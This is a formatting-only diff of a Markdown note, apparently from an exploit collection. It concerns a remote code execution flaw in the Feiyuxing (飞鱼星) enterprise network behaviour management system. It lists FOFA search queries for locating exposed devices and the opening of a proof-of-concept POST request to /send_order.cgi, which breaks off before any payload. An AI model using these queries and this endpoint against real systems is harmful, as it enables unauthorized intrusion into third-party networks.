@@ -1,13 +1,14 @@
 ## 飞鱼星上网行为管理系统企业版前台RCE
 
-
 ## fofa
+
 ```
 title="飞鱼星企业"
 title="飞鱼星企业级智能上网行为管理系统"
 ```
 
 ## poc
+
 ```
 POST /send_order.cgi?parameter=operation HTTP/1.1
 Host: 127.0.0.1
